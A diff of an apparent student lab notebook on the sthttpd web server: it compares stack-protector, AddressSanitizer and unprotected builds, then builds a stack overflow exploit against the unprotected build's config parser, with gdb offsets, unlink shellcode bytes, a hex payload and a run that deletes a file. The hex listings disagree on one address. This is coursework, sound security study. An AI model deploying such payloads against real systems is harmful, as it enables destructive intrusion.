@@ -76,7 +76,6 @@ one continuous string of characters that is greater than 100 lines.
 I test it in gdb:
 
 
-
 Too make variant sp crash, I try passing in a file that is too large. In foo.txt I
 write over 300 'a' characters:
 port=aaaaaaaaaaaa....
@@ -195,9 +194,8 @@ Stepping through we get:
    0x000000000052b449 <read_config+137>:	0f 84 db 07 00 00	je     0x52bc2a <read_config+2154>
 
 The program calls the function__interceptor_fopen and then runs a test command based
-on that program. Then it jumps, which is why the program crashes.
-
-EXPLAIN THIS MORE
+on that program. Then, based on the test it either continues running or jumps to instrutions
+that will crash the program. 
 
 Now we do the same for variant NO:
 
@@ -249,10 +247,183 @@ configuring again:
     $ ./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
     $ make clean
 First version:
-    $ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+    $ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+    $ mv thttpd.o thttpd-sp.s
 It worked, second version:
     $ make clean
-    $ gcc -S -O2 -fno-inline -static-libasan -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+    $ make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+    $ mv thttpd.o thttpd-as.s
 Third version:
     $ make clean
-    $ gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+    $ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+    $ mv thttpd.0 thttpd-no.s
+
+Now compare the three assembly-language files' implementations of the handle_read
+function. I start by opening each version in a separate window so I can easily
+view and compare the differences.
+
+SP vs NO:
+Both SP and NO's handle_read function have the same length, and there are
+actually no differences between the two handle_read functions.
+
+SP vs AS:
+First, AS is much longer than SP. There are so many differences that I try to look for general
+trends as opposed to specific things to compare.
+In AS, the -fsanitize=address tag uses shadow bytes that keep track of whether the stack has been
+pollutted or not. This results in many commands like this:
+
+4580        cmpb    $0, 2147450880(%rax)
+4581        jne     .L1193
+Where the result of cmpb instruction causes (or not) a conditional jump which will crash the program
+depending on whether the stack has been pollutted.
+jne goes to here:
+
+.L1193:
+ 5036        call    __asan_report_load8
+and __asan_report_load8 will crash the program. 
+
+NO vs AS:
+Because SP and NO are identical, the differences between SP/AS and NO/AS will be exactly
+the same.
+
+9. BUILDING AN EXPLOIT
+Finally, I want to build an exploit for the bug in NO that relies on the attacker tricking the victim
+into invoking thttpd with a particular value for the -C option. I start by creating the victim file
+within /sthttpd-2.27.0/src:
+       $ emacs victim.txt
+And I type "to be deleted" in the file.
+I know that the array of characters has length 100, so after character 100 overflow will begin. I
+therefore need to find the addresses at the end of the array, as well as the address of the stack
+return address. I should be able to find the return address by stepping through the program and
+looking at the value of %rsp, the stack pointer register. 
+
+    $ gdb src/thttpd-no
+    (gdb) break read_config
+    (gdb) r -p 12894 -D -C foo.txt
+I updated the file foo.txt so that it would not crash the program while we step through.
+    (gdb) layout next
+I use this to open the gdb visualizer so I can see all the register values while I step through the assembly.
+I look at the visualizer to see the value of %rsp:
+rsp            0x7fffffffce68	   0x7fffffffce68
+I then get the current line address so I can see the total size:
+    (gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffcdd0
+If I subtract one from the other I can get the difference between the address of char line[100] and the
+the return address.
+0x7fffffffce68 - 0x7fffffffcdd0 = 0x98 = 152 bytes in decimal.
+Therefore, if I put 152 bytes between the beginning of the array and the command that we want to overwrite
+with, it should be in the correct position.
+In order to find the correct file to delete (victim.txt) I use the following command:
+echo -n "victim.txt" | od -A n -t x1
+
+76 69 63 74 69 6d 2e 74 78 74
+We need to add a null byte at the end so it will be:
+7669 6374 696d 2e74 7874 00
+We can see by looking at the hex that victim.txt takes up 10 bytes in memory.
+
+For alignment the hex for "victim.txt" should go 16 bytes before the return address.
+0x7fffffffce68 - 0x10 = 0x7FFFFFFFCE58.	
+
+Now I want to find the byte sequence for the remove function. Online I find a
+simple c program that calls remove().
+
+#include<stdio.h> 
+int main() 
+{ 
+   if (remove("abc.txt") == 0) 
+      printf("Deleted successfully"); 
+   else
+      printf("Unable to delete the file"); 
+  
+   return 0; 
+}
+
+I add it into a file "getremove.c"
+I change the value to remove a valid file which I create called "rmthis.txt".
+    $ gcc -O2 getremove.c
+    $ gdb a.out
+    (gdb) break remove
+    (gdb) set disassemble-next-line on
+    (gdb) r
+    (gdb) layout next
+
+I copy each line printed out by disassemble each time I step, which give me:
+
+0x00007ffff7a78da0 <remove+0>:	53	push   %rbx
+0x00007ffff7a78da1 <remove+1>:	48 89 fb        mov    %rdi,%rbx
+0x00007ffff7a78da4 <remove+4>:	e8 87 53 08 00  callq  0x7ffff7afe130 <unlink>
+0x00007ffff7afe130 <unlink+0>:	b8 57 00 00 00  mov    $0x57,%eax
+0x00007ffff7afe135 <unlink+5>:	0f 05   syscall
+0x00007ffff7afe137 <unlink+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
+0x00007ffff7afe13d <unlink+13>:	73 01   jae    0x7ffff7afe140 <unlink+16>
+0x00007ffff7afe13f <unlink+15>:	c3	retq
+0x00007ffff7a78da9 <remove+9>:	85 c0   test   %eax,%eax
+0x00007ffff7a78dab <remove+11>:	74 24   je     0x7ffff7a78dd1 <remove+49>
+0x00007ffff7a78dd1 <remove+49>:	5b	pop    %rbx
+0x00007ffff7a78dd2 <remove+50>:	c3	retq
+
+Now we have the bytes for the unlink function, which is the piece that
+I need. Now I have several of the commands that I need so I create a file
+"ascommands.s" and input the following:
+
+mov $0x7FFFFFFFCE58, %rdi
+mov $0x57, %rax
+syscall
+
+I need to get the machine code for these instructions so I use objdump to do so:
+  $ gcc -c ascommands.s
+  $ objdump -d ascommands.o
+Which prints out:
+0000000000000000 <.text>:
+   0:	48 bf 58 ce ff ff ff 	movabs $0x7fffffffce58,%rdi
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05                	syscall
+  
+This gives me the first bit of machine code that I can put into my exploit file.
+Before I add this, I need to get the hex for "port=". I use the same command as before:
+    $ echo -n "port=" | od -A n -t x1
+70 6f 72 74 3d 00 00 00
+I add three trailing 00's for alignment.
+Now I add this into my exploit file foo.txt:
+
+70 6f 72 74 3d 00 00 00 // port=
+48 bf 38 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 // unlink
+00's ......
+76 69 63 74 69 6d 2e 74 78 74 00 00 00 00 00 00 // victim.txt
+d8 cd ff ff ff 7f 00 00 // 0x7fffffffcdd0 + 0x8 = 7FFFFFFFCDD8
+
+Above we have 43 bits, so we need to add 152 - 43 == 109 "90" bits.
+I use 90 because it is the no op instruction in assembly.
+
+This creates:
+0000000: 70 6f 72 74 3d 00 00 00 48 bf 58 ce ff ff ff 7f
+0000010: 00 00 48 c7 c0 57 00 00 00 0f 05 90 90 90 90 90
+0000020: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000030: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000040: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000050: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000060: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000070: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
+0000080: 90 90 90 90 90 90 90 90 76 69 63 74 69 6d 2e 74
+0000090: 78 74 00 00 00 00 00 00 d8 cd ff ff ff 7f 00 00
+
+I put this into a file test.txt.
+    $ xxd -r test.txt src/please.txt
+    $ cd src
+    $ gdb thttpd-no
+    (gdb) r -p 12894 -D -C please.txt
+
+Starting program: /w/home.20/class/classwba/Documents/33/smashinglab/sthttpd-2.27.0/src/thttpd-no -p 12894 -D -C please.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffce5a in ?? ()
+
+    (gdb) quit
+Now I check for the file victim.txt.
+    $ ls
+    $ ls *vic*
+It does not exist.
+This means that the exploit worked! 
